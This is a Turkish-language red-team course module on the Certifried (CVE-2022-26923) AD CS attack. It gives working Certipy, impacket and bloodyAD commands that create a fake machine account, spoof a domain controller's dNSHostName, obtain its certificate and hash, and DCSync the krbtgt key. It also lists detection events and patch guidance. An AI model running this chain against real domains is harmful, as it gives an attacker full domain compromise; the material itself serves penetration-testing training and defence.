## 1. Kavramsal Temel — Neden Var?

ESC1 ([07.1](./07.1_ESC1_ESC8_Somuru_Teknikleri.md)) "yanlış yapılandırılmış şablon" gerektiriyordu. Certifried ise farklıdır: **varsayılan şablonlarla** çalışan gerçek bir CVE'dir. Kökeni Kerberos'un sertifikayı kullanıcıya nasıl eşlediğidir:

> **PKINIT ile bir sertifika sunulduğunda, DC "bu sertifika hangi hesaba ait?" diye eşleme yapar. CVE-2022-26923 öncesinde bu eşleme, sertifikanın taşıdığı isme (makine hesaplarında `dNSHostName`) dayanıyordu — ve bu öznitelik, makine hesabının SAHİBİ tarafından değiştirilebiliyordu. Saldırgan kendi makine hesabının `dNSHostName`'ini bir DC'ninkiyle aynı yapar, o isimle sertifika alır → DC olarak kimlik doğrular → DCSync → domain sonu.**

Neden bu kadar tehlikeli? (1) **Varsayılan** `Machine`/`User` şablonlarıyla çalışır (özel yanlış yapılandırma gerekmez); (2) Herhangi bir kullanıcı MachineAccountQuota ile makine hesabı yaratabilir; (3) Doğrudan **domain controller kimliğine** yükseltir.

**Analoji:** Kimlik kartı, üzerindeki "çalıştığın bina" alanına göre yetki veriyor. Sen kendi kartındaki bina alanını "genel merkez" (DC) yaparsın; kart basımevi (CA) itiraz etmez; kapıdaki görevli kartı genel merkez yetkisiyle kabul eder.

## 2. Teknik Derinlik — dNSHostName Çakışması ve Eşleme

### 2.1 Zafiyetli eşleme mantığı

```
   Makine hesabı sertifikası eşlemesi (yama öncesi):
   ┌────────────────────────────────────────────────────────────────┐
   │ Sertifika SAN'ında dNSHostName = "DC01.corp.local"              │
   │ DC, PKINIT'te bu ismi arar → DC01$ hesabını bulur → DC01 olarak │
   │   kimlik doğrular                                                │
   │ SORUN: makine hesabının SAHİBİ dNSHostName'i yazabilir          │
   │   (validated write / GenericWrite kendi hesabına)               │
   └────────────────────────────────────────────────────────────────┘
```

### 2.2 Saldırı adımları (mantık)

```
   1) MachineAccountQuota ile FAKE01$ yarat (parolası senin)
   2) FAKE01$'in dNSHostName'ini "DC01.corp.local" yap
      (gerçek DC01$'ta zaten var → çakışma; saldırı sırasında DC01$'ın SPN'i temizlenir/çakışma yönetilir)
   3) Machine şablonuyla sertifika iste → sertifika DC01.corp.local için düzenlenir
   4) PKINIT ile kimlik doğrula → DC01$ makine hesabı olarak TGT
   5) DC01$ = DCSync yetkisi → krbtgt → Golden Ticket (Modül 09)
```

### 2.3 KB5014754 yamasının getirdiği "strong mapping"

Microsoft, Mayıs 2022'de (KB5014754) sertifikaya **`szOID_NTDS_CA_SECURITY_EXT`** uzantısı ekledi: sertifika, sahibinin **SID'ini** taşır. Artık DC, isme değil SID'e göre eşler → dNSHostName manipülasyonu işe yaramaz.

```
   Uyumluluk seviyeleri (KB5014754):
   Compatibility (denetim)  → zayıf eşlemeye izin, sadece uyarı loglar  (geçiş)
   Full Enforcement         → SID uzantısı olmayan/zayıf eşleme REDDEDİLİR
   → "Full Enforcement" aktifse Certifried ve saf SAN-ESC1 çöker.
   Ortam hâlâ Compatibility'deyse (birçok yerde geçiş tamamlanmadı) → açık.
```

> **OPSEC çıkarımı:** Certifried yalnızca yamasız veya "Compatibility" modundaki ortamlarda çalışır. Denemeden önce ortamın enforcement seviyesini tahmin et — yamalı/Full Enforcement'ta gereksiz iz bırakma.

## 3. Pratik Uygulama

### 3.1 Certipy ile tek komut (otomatik)

```bash
# Certipy, tüm Certifried zincirini otomatikleştirir
certipy account create -u jdoe@corp.local -p 'Welcome1' -user 'FAKE01' \
  -dns 'DC01.corp.local' -dc-ip 10.10.10.5
#  → FAKE01$ oluşturulur, dNSHostName = DC01.corp.local

certipy req -u 'FAKE01$'@corp.local -p '<FAKE01 pass>' -ca 'CORP-CA' -template 'Machine' \
  -dc-ip 10.10.10.5
#  → DC01 için sertifika (dc01.pfx)

certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
#  → DC01$ olarak PKINIT TGT + NT hash
```

**Örnek çıktı:**
```
[*] Creating machine account 'FAKE01$' with dns 'DC01.corp.local'
[*] Requesting certificate for 'FAKE01$' with template 'Machine'
[*] Got certificate with DNS Host Name 'DC01.corp.local'
[*] Authenticating as 'DC01$' via PKINIT
[*] Got hash for 'DC01$@corp.local': aad3b...:31d6...   ← DC makine hesabı!
```

### 3.1.1 Alternatif: mevcut makine hesabıyla (MAQ=0 durumu)

```bash
# MachineAccountQuota=0 ise yeni hesap yaratılamaz. Ama kontrol ettiğin bir makine
# hesabın varsa (04.x ile ele geçirdiğin), onun dNSHostName'ini manipüle et:
certipy account update -u jdoe@corp.local -p 'Welcome1' -user 'WS042$' \
  -dns 'DC01.corp.local' -dc-ip 10.10.10.5
# → WS042$ üzerinde yazma hakkın (veya makinenin kendisi) gerekir
```

### 3.2 DC$ hash ile DCSync

```bash
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass 'corp.local/DC01$'@dc01.corp.local -just-dc-user krbtgt
#  → krbtgt hash → Golden Ticket (Modül 09)
```

### 3.3 Manuel bileşenler (kavramsal)

```bash
# Makine hesabı ekle (06.3 ile aynı temel)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P!' corp.local/jdoe:'Welcome1'
# dNSHostName yaz (bloodyAD)
bloodyAD -u jdoe -p 'Welcome1' -d corp.local --host dc01 set object 'FAKE01$' dNSHostName -v 'DC01.corp.local'
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |
|--------|--------------|--------------------|--------------------|
| Makine hesabı + dNSHostName manipülasyonu | **T1136.001** / T1098 | **4741** (hesap oluşturuldu), **5136** dNSHostName değişti | [Blue 07.4](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.4_PKI_Izleme_ve_Olay_Kayitlari.md) |
| Sertifika talebi (makine adına) | **T1649** | **4886/4887** — dNSHostName çakışması | [Blue 07.4](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.4_PKI_Izleme_ve_Olay_Kayitlari.md) |
| PKINIT (DC olarak) | T1558 | 4768 certificate; DC makine hesabı beklenmedik PKINIT | [Blue 07.4](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.4_PKI_Izleme_ve_Olay_Kayitlari.md) |

**OPSEC notları:**
- **En net IOC: `dNSHostName` çakışması** — iki hesabın (FAKE01$ ve DC01$) aynı dNSHostName'i taşıması ve/veya 5136'da bir makine hesabının dNSHostName'inin bir DC'ninkiyle eşitlenmesi son derece anormaldir ([Blue 07.4](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.4_PKI_Izleme_ve_Olay_Kayitlari.md)).
- **Yama = birincil savunma.** Bu bir CVE'dir; KB5014754 + Full Enforcement uygulanmışsa teknik çalışmaz. Denemeden önce enforcement seviyesini değerlendir; yamalı ortamda 4886/4887 + KDC red = boş yere alarm.
- **4741 kullanıcı-kaynaklı makine hesabı** yine anormaldir (RBCD'deki gibi, [06.3](../Modul_06_Kerberos_Delegation_Saldirilari/06.3_Resource_Based_Constrained_Delegation.md)). MachineAccountQuota=0 ise bu adım engellenir.
- **Temizlik:** Oluşturduğun FAKE01$'i sil, dNSHostName çakışmasını geri al — hem tespit hem de gerçek DC'nin isim çözümlemesini bozmamak için (operasyonel etik: ortamı bozma).
- Bu yol DC$ hash verdiğinden **doğrudan domain hakimiyeti**dir; kullanmadan önce yetkilendirme kapsamını teyit et (§6).

## 5. Doğrulama / Lab

```bash
# 1) Lab: yamasız/Compatibility modunda AD CS + varsayılan Machine şablonu. MAQ=10.
# 2) certipy account create -dns DC01.corp.local → req Machine → auth → DC01$ hash
# 3) DC01$ ile secretsdump -just-dc-user krbtgt → krbtgt hash
# 4) Blue: 4741 + 5136(dNSHostName) + 4886 çakışmasını yakala
Get-WinEvent -FilterHashtable @{LogName='Security';Id=5136} | ? Message -match 'dNSHostName'
# 5) KB5014754 Full Enforcement uygula → aynı saldırının reddedildiğini doğrula
```

Atomic Red Team: **T1649 / T1136.001** → Blue doğrulaması [Blue 07.4](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.4_PKI_Izleme_ve_Olay_Kayitlari.md).

### Gerçek-dünya Certifried zinciri (sıradan kullanıcıdan DC$'a)

```
   1) jdoe (sıradan domain user) → MAQ=10 (varsayılan)
   2) certipy account create -user FAKE01 -dns DC01.corp.local
      → FAKE01$ oluştu, dNSHostName = DC01.corp.local (çakışma)
   3) certipy req -template Machine (VARSAYILAN şablon) → DC01 için sertifika
   4) certipy auth -pfx dc01.pfx → DC01$ NT hash + TGT
   5) secretsdump DC01$ → krbtgt → Golden Ticket → kalıcı domain hakimiyeti
   Hiç yanlış-yapılandırılmış şablon gerekmedi — varsayılan Machine şablonu + CVE yeterli.
```

### Ek: SPN/çakışma yönetimi (aracın perde arkası)

```
   dNSHostName çakışması yaratınca gerçek DC01$'ın SPN'leri (HOST/DC01, RestrictedKrbHost)
   ile çakışır. Certipy bunu, FAKE01$'in servicePrincipalName'lerini geçici temizleyerek
   yönetir (çünkü SPN benzersizlik kısıtı vardır). auth sonrası ortamı geri toparla:
   dNSHostName'i sıfırla / FAKE01$'i sil → gerçek DC01'in isim çözümlemesini bozma.
```
